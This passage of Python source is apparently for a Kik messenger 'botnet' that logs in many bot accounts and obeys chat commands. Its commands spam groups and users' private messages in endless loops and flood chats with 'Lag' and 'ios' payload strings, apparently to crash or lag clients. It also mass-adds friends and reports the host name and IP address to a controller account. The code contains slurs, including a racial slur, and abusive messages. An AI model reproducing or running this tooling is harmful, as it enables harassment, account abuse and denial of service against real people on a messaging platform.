                                self.client.send_chat_message(GJID, "4")
                                time.sleep(1)
                                self.client.send_chat_message(GJID, "3")
                                time.sleep(1)
                                self.client.send_chat_message(GJID, "2")
                                time.sleep(1)
                                self.client.send_chat_message(GJID, "1")
                                time.sleep(1)
                                self.client.send_chat_message(GJID, "BOMBS AWAY!")
                                while safemode == False:
                                       spam_message = mssg.replace("groupspam ", "", 1)
                                       while safemode == False:
                                           print("Spamming gifs about \"" + gif_query + "\"!")
                                           while safemode == False:
                                                  self.client.send_gif_image(GJID, gif_query)
                    else:
                        if safemode == False:
                            self.client.send_chat_message(GJID, "THIS IS YOUR 5 SECOND WARNING TO LEAVE THE GROUP.")
                            time.sleep(1)
                            self.client.send_chat_message(GJID, "5")
                            time.sleep(1)
                            self.client.send_chat_message(GJID, "4")
                            time.sleep(1)
                            self.client.send_chat_message(GJID, "3")
                            time.sleep(1)
                            self.client.send_chat_message(GJID, "2")
                            time.sleep(1)
                            self.client.send_chat_message(GJID, "1")
                            time.sleep(1)
                            self.client.send_chat_message(GJID, "BOMBS AWAY!")
                            while safemode == False:
                                spam_message = mssg.replace("groupspam ", "", 1)
                                while safemode == False:
                                    self.client.send_chat_message(GJID, emoji.emojize(spam_message))
                                    time.sleep(0.5)
            elif mssg == "rickroll":
                   self.client.send_chat_message(GJID, "We're no strangers to love")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "You know the rules and so do I (do I)")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "A full commitment's what I'm thinking of")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "You wouldn't get this from any other guy")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "I just wanna tell you how I'm feeling")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "Gotta make you understand")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "Never gonna give you up!")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "Never gonna let you down..")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "Never gonna run around and...")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "Desert youuu!")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "Never gonna make you cry")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "Never gonna sayyy goodbye!")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "Never gonna tell a lie and hurt you...")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "We've known each other for so long")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "Your heart's been aching, but you're too shy to say it")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Say it..")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "Inside, we both know what's been going on")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Going on..")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "We know the game and we're gonna play it")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "And if you ask me how I'm feeling")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "Gotta make you understand")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "Never gonna give you up!")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "Never gonna let you down..")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "Never gonna run around and...")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "Desert youuu!")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "Never gonna make you cry")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "Never gonna sayyy goodbye!")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "Never gonna tell a lie and hurt you...")
                   time.sleep(4)
                   self.client.send_chat_message(GJID, "Never gonna give..")
                   time.sleep(4)
                   self.client.send_chat_message(GJID, "Never gonna give...")
                   time.sleep(4)
                   self.client.send_chat_message(GJID, "Never gonna give you up!")
                   time.sleep(4)
                   self.client.send_chat_message(GJID, "Never gonna give..")
                   time.sleep(4)
                   self.client.send_chat_message(GJID, "Never gonna give...")
                   time.sleep(4)
                   self.client.send_chat_message(GJID, "Never gonna give you up!")
                   time.sleep(5)
                   self.client.send_chat_message(GJID, "I mean it..")
            elif mssg == "barbie girl":
                   self.client.send_chat_message(GJID, "Hiya Barbie!")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, "Hi Ken!")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, "Wanna go for a ride?")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, "SURE KEN!")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, " I'm a Barbie girl,")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, "In a Barbie world.")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Life in plastic..")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Its fantastic!!")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "You can brush my hair,'")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "And indress me everywhere..")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "Imagination!")
                   time.sleep(0.5)
                   self.client.send_chat_message(GJID, "Life is your creation!")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "COME ON BARBIE,")
                   time.sleep(0.5)
                   self.client.send_chat_message(GJID, "LETS GO PARTY!!")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, "Ahh ahh ahh,")
                   time.sleep(0.5)
                   self.client.send_chat_message(GJID, "YEAH!!")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, "COME ON BARBIE,")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, "LETS GO PARTY!!")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Ooo Woah")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Ooo Woahh!")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, "COME ON BARBIE,")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, "LETS GO PARTY!!")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Ahh ahh ahh,")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "YEAH!!")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, "COME ON BARBIE,")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, "LETS GO PARTY!!")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Oooh oooh")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, "Oooh oohh!")
                   time.sleep(3)
                   self.client.send_chat_message(GJID, "Im a blonde, bimbo girl,")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, "In a fantasy world")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, "Dress me up,")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Make me tight,")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Im your dolly")
                   time.sleep(2.5)
                   self.client.send_chat_message(GJID, "YOUR MY DOLL,")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "ROCK N ROLL,")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "FEEL THE GLAMOR IN PINK!")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "KISS ME HERE,")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, "TOUCH ME THERE,")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "HANKY-PANKYY")
                   time.sleep(3)
                   self.client.send_chat_message(GJID, "You can touch..")
                   time.sleep(3)
                   self.client.send_chat_message(GJID, "You can play...")
                   time.sleep(3)
                   self.client.send_chat_message(GJID, "If you say, IM ALWAYS YOURS!")
                   time.sleep(1.5)
                   self.client.send_chat_message(GJID, "Oooh ooh")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, " I'm a Barbie girl,")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "In a Barbie world.")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, "Life in plastic..")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Its fantastic!!")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "You can brush my hair,'")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, "And undress me everywhere..")
                   time.sleep(2)
                   self.client.send_chat_message(GJID, "Imagination!")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Life is your creation!")
            elif mssg == "ping":
                self.client.send_chat_message(GJID, "Ping these nuts, motherfucker!")
            elif mssg == "slaves":
                self.client.send_chat_message(GJID, "Yes, Daddy?")
            elif mssg == "spin":
                self.client.send_chat_message(GJID, ".spin")
            elif mssg == "roll 100":
                self.client.send_chat_message(GJID, ".r 100")
            elif mssg == "roll 1k":
                self.client.send_chat_message(GJID, ".r 1k")
            elif mssg == "roll 10k":
                self.client.send_chat_message(GJID, ".r 10k")
            elif mssg == "roll 100k":
                self.client.send_chat_message(GJID, ".r 100k")
            elif mssg == "roll 500k":
                self.client.send_chat_message(GJID, ".r 500k")
            elif mssg == "roll 1m":
                self.client.send_chat_message(GJID, ".r 1m")
            elif mssg == "roll 1om":
                self.client.send_chat_message(GJID, ".r 10m")
            elif mssg == "bot game":
                self.client.send_chat_message(GJID, ".b 100")
            elif mssg == "bot hit":
                self.client.send_chat_message(GJID, ".b h")
            elif mssg == "roll 1k":
                self.client.send_chat_message(GJID, ".r 1000")
            elif mssg == "slot purge":
                for x in range(1, 10):
                    self.client.send_chat_message(GJID, ".sl 20k")
                    time.sleep(0.3)
            elif mssg == "spam leader":
                for x in range(1, 20):
                    self.client.send_chat_message(GJID, ".l")
            elif mssg == "spam me":
                i = 1
                while i <= 50:
                    self.client.send_chat_message(GJID, ".me")
                    i += 1
            elif mssg == "kek":
                for x in range(1, 10):
                    self.client.send_chat_message(GJID, "kek " * 8)
            elif mssg == "delay":
                for x in range(1, 10):
                    self.client.send_chat_message(GJID, "kek " * 8)
                    time.sleep(0.5)
            elif mssg == "delay2":
                for x in range(1, 10):
                    self.client.send_chat_message(GJID, "kek " * 8)
                time.sleep(0.5)
            elif mssg == "delay3":
                for x in range(1, 10):
                    self.client.send_chat_message(GJID, "kek " * 8)
                    time.sleep(1)
            elif mssg == "Lag10":
                for x in range(1, 10):
                    self.client.send_chat_message(GJID, droid)
            elif mssg == "Lag50":
                for x in range(1, 50):
                    self.client.send_chat_message(GJID, droid)
            elif mssg == "Lag100":
                for x in range(1, 100):
                    self.client.send_chat_message(GJID, droid)
            elif mssg == "Lag500":
                for x in range(1, 500):
                    self.client.send_chat_message(GJID, droid)
            elif mssg == "Lag1k":
                for x in range(1, 1000):
                    self.client.send_chat_message(GJID, droid)
            elif mssg == "ios test":
                for x in range(1, 10):
                    self.client.send_chat_message(GJID, ios * 100)
            elif mssg == "ios10":
                for x in range(1, 10):
                    self.client.send_chat_message(GJID, ios * 100)
            elif mssg == "ios50":
                for x in range(1, 50):
                    self.client.send_chat_message(GJID, ios * 100)
            elif mssg == "ios100":
                for x in range(1, 100):
                    self.client.send_chat_message(GJID, ios)
            elif mssg == "ios500":
                for x in range(1, 500):
                    self.client.send_chat_message(GJID, ios)
            elif mssg == "ios1k":
                for x in range(1, 10):
                    self.client.send_chat_message(GJID, ios)
            elif mssg == "friend":
                self.client.send_chat_message(GJID, "This can only be used in PMs")
            elif mssg.startswith("gif"):
                gif_query = mssg.replace("gif ", "", 1)
                self.client.send_chat_message(GJID, "Searching for a gif with the query \"" + str(gif_query) + "\"...")
                try:
                    self.client.send_gif_image(GJID, gif_query)  #This tries to send a gif with the query
                except:
                    self.client.send_chat_message(GJID, "I couldn't find a gif for the query" +
                        gif_query + "\"!")
            elif mssg == "commands":  #command for listing the commands.
                self.client.send_chat_message(GJID,
                    "To spam a user's PMs, use \"spam [JID or Username] w/ [Message]\", this command works both in groups and PMs.\n\nTo spam a group, say \"friend\" in PMs to add me then add me to the group you wish to spam and say \"groupspam [message]\".\n\n Keep in mind that once you start spam, it will not stop until you restart the bot.")
            elif mssg.startswith("spam"):  #Command for spamming a user.
                if mssg == "spam":
                    self.client.send_chat_message(GJID,
                        "To use the spam tool, please use \"spam [JID or Username] w/ [Message]\", or \"spam gif [JID or Username] w/ [query]\".\n\nExample: \"spam bacon_6zl@talk.kik.com w/ Blue's a pretty color.\"")
                else:
                        if " w/ " in mssg:  # This checks if "w/" was in the string and continues if so
                           if mssg.startswith("spam gif"):
                              failed = False
                              remove_spam = mssg.replace("spam gif ", "")  # This takes the first part of the message off to isolate the jid/username and query
                              split_string = remove_spam.split("w/ ", 1)  # This splits the message into the JID/username and message
                              jid_to_spam = split_string[0]
                              if "@talk.kik.com" in jid_to_spam:  #Temporary patch
                                  jid_to_spam = jid_to_spam[:-17]  #Temporary patch
                                  gif_query = split_string[1]  # This isolates the query we got in split_string
                                  try:  # This attempts the gif query once first to check if its valid
                                           self.client.send_gif_image(jid_to_spam, gif_query)  # This tries to send a gif with the query
                                  except:  # This is triggered if it fails
                                        failed = True  # I could have just used "raise someerror" and except, but I was tired when I wrote this... I'ma just leave it. Don't @ me nobody really reads my code anyways. Except you... Hi nerd.
                                  if failed == True:
                                        self.client.send_chat_message(GJID, "I couldn't find a gif for the query" + gif_query + "\"!")  # This lets the user know it failed
                                  else:  # This is triggered if the gif query does not fail
                                        self.client.send_chat_message(GJID, "I am spamming gifs to \"" + jid_to_spam + "\" with the query \"" + gif_query + "\"!\n(Keep in mind that some Kik mods cannot see gifs sent from bots.)")  # This lets the user on kik know it is spamming gifs
                                        if safemode == False:
                                            while safemode == False:
                                                self.client.send_gif_image(jid_to_spam, gif_query)
                                                time.sleep(0.4)
                                        elif safemode == True:
                                               self.client.send_chat_message(GJID, "Spam mode off. Message @Pyro!")
                              else:
                                    remove_spam = mssg.replace("spam ", "")  #This takes the first part of the message off to isolate the jid/username and message
                                    split_string = remove_spam.split(" w/ ", 1)  #This splits the message into the JID/username and message
                                    jid_to_spam = [0]
                                    if "@talk.kik.com" in jid_to_spam:  #Temporary patch
                                        jid_to_spam = jid_to_spam[:-17]  #Temporary patch
                                    if jid_to_spam.startswith("@"):  #This reminds the user they dont need an @ if they use one, and removes it for them.
                                        self.client.send_chat_message(GJID, "Reminder: You do not need to put an \"@\" symbol before the username.")
                                        jid_to_spam = jid_to_spam.replace("@", "", 1)
                                        time.sleep(0.5)  #Waits half a second
                                    message_to_spam = split_string[1]  #Isolates the message we got in split_string
                                    if "groups" in jid_to_spam:  #Checks if the JID they gave is actually a GJID and warns them if so.
                                        self.client.send_chat_message(GJID, "You can't use a GJID for that.")
                                    else:
                                        if safemode == False:
                                            while safemode == False:
                                                self.client.send_chat_message(jid_to_spam, emoji.emojize(message_to_spam))
                                                time.sleep(0.4)
                           else:
                                    if safemode == True:
                                          self.client.send_chat_message(GJID, "Disallowed. Message @PyRo!")
                        else:
                                 self.client.send_chat_message(GJID, "You need to put a \"w/\" with one space on both sides between the JID/username and the spam message.")
                                 time.sleep(0.5)
            elif mssg.startswith("slap"):
                if mssg == "slap" and safemode == False:
                    self.client.send_chat_message(GJID, "Slap a hoe kust type \" Slap USER or JID w/ MSSG\n\nExample: \"slap bacon_6zl@talk.kik.com w/ Blue's a pretty color.\"")
                else:
                    if " w/ " in mssg:
                        remove_slap = mssg.replace("slap ", "")
                        split_string = remove_slap.split(" w/ ", 1)
                        jid_to_slap = split_string[0]
                        if "@talk.kik.com" in jid_to_slap:
                            jid_to_slap = jid_to_slap[:-17]
                        if jid_to_slap.startswith("@"):
                            jid_to_slap = jid_to_slap.replace("@", "", 1)
                        message_to_send = split_string[1]
                        if "groups" in jid_to_slap:
                            self.client.send_chat_message(GJID, "You can't use a GJID for the slap command.")
                        else:
                            self.client.send_chat_message(GJID, "Finna slap the fuck outta \"" + jid_to_slap + "\" and tell em \"" + emoji.emojize(message_to_send) + "\"!")
                            print("Finna slap the fuck out of \"" + jid_to_slap + "\" and tell em\"" + emoji.emojize(message_to_send) + "\"!")
                            self.client.send_chat_message(jid_to_slap, emoji.emojize(message_to_send))
                    else:
                        self.client.send_chat_message(GJID, "You need to put a \"w/\" with one space on both sides between the JID/username and the message.\n\n(Error: w/ not found in message string.)")
                        time.sleep(0.5)
            elif mssg.startswith("slap 50"):
                  if mssg == "slap 50" and safemode == False:
                    self.client.send_chat_message(GJID, "Slap a hoe kust type \" Slap USER or JID w/ MSSG\n\nExample: \"slap bacon_6zl@talk.kik.com w/ Blue's a pretty color.\"")
                  else:
                    if " w/ " in mssg:
                        remove_slap = mssg.replace("slap ", "")
                        split_string = remove_slap.split(" w/ ", 1)
                        jid_to_slap = split_string[0]
                        if "@talk.kik.com" in jid_to_slap:
                            jid_to_slap = jid_to_slap[:-17]
                        if jid_to_slap.startswith("@"):                            
                            jid_to_slap = jid_to_slap.replace("@", "", 1)
                        message_to_send = split_string[1]
                        if "groups" in jid_to_slap:
                            self.client.send_chat_message(GJID, "You can't slap GJIDs yet!")
                        else:
                            self.client.send_chat_message(GJID, "Finna slap the fuck outta \"" + jid_to_slap + "\" and tell em \"" + emoji.emojize(message_to_send) + "\"!")
                            print("Finna slap the fuck out of \"" + jid_to_slap + "\" and tell em\"" + emoji.emojize(message_to_send) + "\"!")
                            for x in range(0,50):
                                 self.client.send_chat_message(jid_to_slap, emoji.emojize(message_to_send))
                                 time.sleep(0.5)
                    else:
                        self.client.send_chat_message(GJID, "You need to put a \"w/\" with one space on both sides between the JID/username and the message.\n\n(Error: w/ not found in message string.)")
                        time.sleep(0.5)
                        
            elif mssg.startswith("sendfriend"):
                  if mssg == "sendfriend":
                    self.client.send_chat_message(GJID,
                        "To use the sendfriend tool, please use \"sendfriend [JID or Username]\".\n\nExample: \"sendfriend stethosayshello_3pf@talk.kik.com\"")  #This reminds the user that this command is best for groups
                  else:
                    remove_sendfriend = mssg.replace("sendfriend ", "", 1)
                    if "@talk.kik.com" in remove_sendfriend:
                        remove_sendfriend = remove_sendfriend[:-17]
                        self.client.send_chat_message(GJID, "Sending friend attribution request to \"" + remove_sendfriend + " !")
                        self.client.send_chat_message(remove_sendfriend, "KikMobbd Nigga!")
                        self.client.add_friend(remove_sendfriend)
            elif mssg.startswith("leave"):
                remove_leave = mssg.replace("leave ", "", 1)
                if mssg == "leave":
                    self.client.send_chat_message(GJID, "To use the leave command, please use \"leave [GJID]\"")
                else:
                    if "groups" in remove_leave:
                        self.client.send_chat_message(GJID, "Attempting to leave \"" + remove_leave + "\"!")
                        self.client.leave_group(remove_leave)
                    else:
                        self.client.send_chat_message(GJID, "You must use a valid GJID in the leave command! You used \"" + remove_leave + "\"!")
            
            elif mssg == "RickRoll":
                   self.client.send_chat_message(GJID, "We're no strangers to love")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "You know the rules and so do I (do I)")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "A full commitment's what I'm thinking of")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "You wouldn't get this from any other guy")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "I just wanna tell you how I'm feeling")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Gotta make you understand")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Never gonna give you up!")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Never gonna let you down..")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Never gonna run around and...")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Desert youuu!")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Never gonna make you cry")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Never gonna sayyy goodbye!")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Never gonna tell a lie and hurt you...")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "We've known each other for so long")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Your heart's been aching, but you're too shy to say it")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "say it..")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Inside, we both know what's been going on")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "going on..")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "We know the game and we're gonna play it")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "And if you ask me how I'm feeling")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Gotta make you understand")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Never gonna give you up!")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Never gonna let you down..")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Never gonna run around and...")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Desert youuu!")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Never gonna make you cry")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Never gonna sayyy goodbye!")
                   time.sleep(1)
                   self.client.send_chat_message(GJID, "Never gonna tell a lie and hurt you...")
                   time.sleep(0.5)
                   self.client.send_chat_message(GJID, "Never gonna give..")
                   time.sleep(0.5)
                   self.client.send_chat_message(GJID, "Never gonna give...")
                   time.sleep(0.5)
                   self.client.send_chat_message(GJID, "Never gonna give you up!")
                   time.sleep(0.5)
                   self.client.send_chat_message(GJID, "Never gonna give..")
                   time.sleep(0.5)
                   self.client.send_chat_message(GJID, "Never gonna give...")
                   time.sleep(0.5)
                   self.client.send_chat_message(GJID, "Never gonna give you up!")
                   time.sleep(3)
                   self.client.send_chat_message(GJID, "I mean it...")
                    
        def on_roster_received(self, response: FetchRosterResponse):
            global name
            response: chatting.IncomingChatMessage
            #print("Roster:\n" + '\n'.join([str(member) for member in response.peers]))
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            self.client.send_chat_message(
                debug_jid,
                emoji.emojize(":warning: \"" + name + "\" is online!\nHost: " + str(hostname) + "\nIP: " + str(ip_address)))
            for user in jid_list:
                self.client.add_friend(user)
                time.sleep(0.3)
        def on_connection_failed(self, response: ConnectionFailedResponse):
            global result
            result = False
            print(bcolors.OKGREEN + emoji.emojize(" Kik fuckn trippn..") + bcolors.ENDC)
            oof = open("loginerror.txt", "a+")
            oof.write(username_thing + str(thing) + "\n")
            oof.close()
        def on_login_error(self, login_error: LoginError):
            global result
            result = False  #To next login
            if login_error.is_captcha():  #Triggered Captcha
                print(bcolors.FAIL +
                      emoji.emojize(":warning: Fucking @" + username_thing + str(thing) + ", is captcha'd.") + bcolors.ENDC)
            else:
                print(bcolors.FAIL +
                      emoji.emojize(":warning: Wrong info for @" + username_thing + str(thing) + " fucking retard.") + bcolors.ENDC)
                      
                      
    if __name__ == '__main__':
        main()
clear = open("loginerror.txt", "w+")
clear.close()
if attempt_number == 0:
    while int(thing) > 0:  #This loops through bots
        for i in range(thing):
            stetho_string = username_thing + str(thing)
            login(stetho_string, given_pass, thing)
            while result is None:
                pass
            thing = int(thing) - 1  #Decreases bot count
    attempt_number = attempt_number + 1  #Increases attempt number
def retry_login(password):
    errors = open("loginerror.txt", "r")
    number_of_errors = 0  #This sets the number of errors to 0 for the next step
    read_errors = errors.read()  #This reads loginerror.txt
    errors_list = read_errors.split("\n")  #Makes result into errors_list
    for user in errors_list:
        if user:
            number_of_errors += 1
    if " " in errors_list:
    	   number_of_errors = number_of_errors - 1
    if number_of_errors > 0:
        print(bcolors.OKBLUE +
              emoji.emojize("Kik fucked up " + str(number_of_errors) + " times. Retrying...") + bcolors.ENDC)
        ominous_dots(bcolors.OKGREEN + emoji.emojize("HOLD ON...!") + bcolors.ENDC)
        print("\n")
        time.sleep(1)
        clear = open("loginretry.txt", "w+")
        clear.close()
        oof = open("loginretry.txt", "a+")
        for user in errors_list:  #ADDS USERS IN ERRORS LIST TO loginretry.txt
            oof.write(user + "\n")
        oof.close()
        retry = open("loginretry.txt", "r")  #This opens loginretry.txt to read it
        read_retry = retry.read()  #This reads loginretry.txt
        retry_list = read_retry.split("\n")  #This splits loginretry.txt into a list
        clear = open("loginerror.txt", "w+")  #Clears the text from loginerror.txt
        clear.close()  #This closes the file, always a good practice.
        for name in retry_list:  #This loops through the failed logins
            if number_of_errors > 0:
                if " " in name:  #This makes lines with spaces blank
                    checked_name = name.replace(" ", "")
                else:
                    checked_name = name
                if not not checked_name:  #This ignores blank lines
                    login(checked_name, password, number_of_errors)
                time.sleep(18)  #This waits 5 sec between logins
                number_of_errors = number_of_errors - 1  #Subtracts 1 error from count.
        retry.close()
errors = open("loginerror.txt", "r")  #This opens loginerror.txt to read it
number_of_errors = 0  #This sets the number of errors to 0 to later count the errors
read_errors = errors.read()  #This reads loginerror.txt
errors_list = read_errors.split("\n")


for user in errors_list:
    if user:
        number_of_errors += 1
if " " in errors_list:
    number_of_errors = number_of_errors - 1
number_of_attempts = 30
while number_of_attempts > 0:
    if number_of_errors > 0:
        retry_login(given_pass)
    number_of_attempts = number_of_attempts - 1
jidlist_file = open("jidlist.txt", "r")
jidlist_read = jidlist_file.read()
jid_list = jidlist_read.split("\n")
#keep_alive()
time.sleep(2)
print(bcolors.OKGREEN + emoji.emojize("\n:black_small_square: \"Spam [JID or Username] w/ [Message]\" - Used to spam a user's PMs.\n:black_small_square: \"Spam Gif [JID or Username] w/ [Query]\" - Used to spam a user's PMs with a gif.\n:black_small_square: \"slap [JID or username] w/ [Message]\" - Used for forwarding a single message to a user.\n:black_small_square: \"slap Gif [JID or username] w/ [Query]\" - Used for forwarding a single gif to a user.\n:black_small_square: \"Friend\" - Used to add the bot as a friend so that you can add it to groups.\n:black_small_square: \"SendFriend [JID or Username]\" - Used to send a friend attribution request to a user.\n:black_small_square: \"GroupSpam [Message]\" - Used to spam the group that this command is used in.\n:black_small_square: \"GroupSpam Gif [Query]\" - Used to spam the group that this command is used in with gifs.\n:black_small_square: \"Gif [Query]\" - Used to send a single gif in the group that this command is used in.\n:black_small_square: \"Leave [GJID]\" - Used for making your bot(s) leave groups.\n") + bcolors.ENDC)  #This explains the commands to the user
print(bcolors.OKBLUE + emoji.emojize("\n:warning: You can now use the botnet.\n") + bcolors.ENDC)  #This lets the user know the botnet is ready
clear = open("loginretry.txt", "w+")
clear.close()
while spam == "QmxhemUgaXMgQmFlLiBDaGEtQ2hhIFJlYWwtU21vb3Rofg==":  #This keeps the bot idle. (spam is just the variable that happens to be convenient for a while loop)
    in_console_message = input("")
    if in_console_message.lower() == "ping":
        print(bcolors.OKGREEN + emoji.emojize("\nDADDY.\n") + bcolors.ENDC)
    else:
        print(bcolors.FAIL + emoji.emojize("\n:warning: You can't use commands directly in the console! You need to message your bots on Kik.") + bcolors.ENDC)
